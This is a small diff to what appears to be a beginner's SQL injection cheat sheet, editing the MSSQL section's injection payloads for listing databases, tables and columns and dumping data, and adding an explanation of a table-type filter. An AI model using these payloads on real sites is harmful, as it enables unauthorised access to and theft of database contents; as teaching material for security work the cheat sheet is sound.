@@ -107,10 +107,10 @@ Most of the SQLIs you will come across as a beginner will be MySQL. But, in some
 ' UNION ALL SELECT 1,DB_NAME(),3--
 
 # Get DBs
-' SELECT name FROM master..sysdatabases
+' SELECT name FROM master.sys.databases--
 
 # Get tables
-' SELECT name FROM <db>..sysobjects WHERE xtype = 'U'
+' SELECT name FROM <db>.sys.objects WHERE type = 'U'
 
 # Get columns
 ' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '<table>')
@@ -118,7 +118,7 @@ Most of the SQLIs you will come across as a beginner will be MySQL. But, in some
 # Dump data
 ' SELECT  <column1>, <column2> from <table>
 ```
-
+The general syntax of `MSSQL` should make sense. But there are some weird things. `WHERE type = 'U'` just means user-defined table.
 #### PostgreSQL
 
 ```txt
